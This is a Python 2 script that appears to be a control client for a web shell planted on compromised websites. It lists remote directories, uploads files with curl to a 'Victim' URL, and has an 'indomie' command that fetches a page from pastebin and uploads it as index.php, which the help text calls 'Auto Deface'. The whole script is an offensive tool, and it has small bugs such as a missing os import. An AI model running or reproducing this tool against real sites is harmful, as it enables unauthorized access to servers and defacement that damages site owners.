#!usr/bin/env python
from urllib2 import *
from platform import system
import sys

merah = '\033[31m'
normal = '\033[0m'
putih = '\033[1;37m'
lime = '\033[1;32m'
ungu = '\033[35m'
kuning = '\033[33m'


def sabun():
	if system() == 'Linux':
		os.system("clear")
	if system() == 'Windows':
		os.system("cls")
def target():
	print "\n"
	print ""+lime+"[*]"+putih+" "+sayur+"/"
	print ""+ungu+"[+]"+putih+" Url Uploader"
	print ""+merah+"[!]"+putih+" Ex : files/uploader.php?uwu\n"
	web = raw_input("Url >> ")
	up = raw_input("File >> ")
	upload = "curl -F anjay=@/home/xdizzy25/"+ up +" "+ sayur+"/"+ web+"\n \n"
	os.system(upload)
	print ""+lime+"[*]"+putih+" Victim : "+sayur+"/"+web+"\n"
	chose()
def loop():
	sabun()
	chose()
def chose():
	detol = raw_input(">> ")
	if detol == "upload":
		file = raw_input("File: ")
		print "\n"
		upload = "curl -F anjay=@/home/xdizzy25/"+file+" "+sayur+"?upload"
		os.system(upload)
		print "\n"
		chose()
	elif detol == "dir":
		gz = sayur+"?dir"
		op = urlopen(gz).read()
		print op
		chose()
	elif detol == "exit":
		exit();
	elif detol == "ls":
		gz = sayur+"?ls"
		ea = urlopen(gz).read()
		print ea
		chose()
	elif detol == "help":
		print merah+"\nWhats wrong?"
		print putih+"upload  = [      Upload file       ]"
		print putih+"indomie = [ Auto Deface(index.php) ]\n"
	elif detol == "indomie":
		sabun();
		eaaa = "wget https://pastebin.com/raw/XFZwUUaQ -o index.php"
		apload = "curl -F anjay=@/home/xdizzy25/25/uploader/index.php "+sayur+"?site"
		os.system(eaaa)
		os.system("mv XFZwUUaQ index.php")
		os.system(apload)
		print
	else:
		print ""+merah+"[!] "+putih+"Command not Found"
		print "    try: help for more information"
	chose()
	loop()
sayur = raw_input("URL >> ")
sabun()
eaea = sayur+"?infos"
aeae = urlopen(eaea).read()
print putih+"Hi! Welcome to Winux box                                        version 3.1 codename Indomie"
print putih+"Gmail: xdizzy25@gmail.com                                       You can do it!              "
print putih+"Github: Coming soon                                             Everything is Vulnerable    "
print putih+"Use this tools with internet access                             Happy Hacking!              \n"
print lime+"[*] "+putih+"URL        : "+sayur+""
print aeae
chose()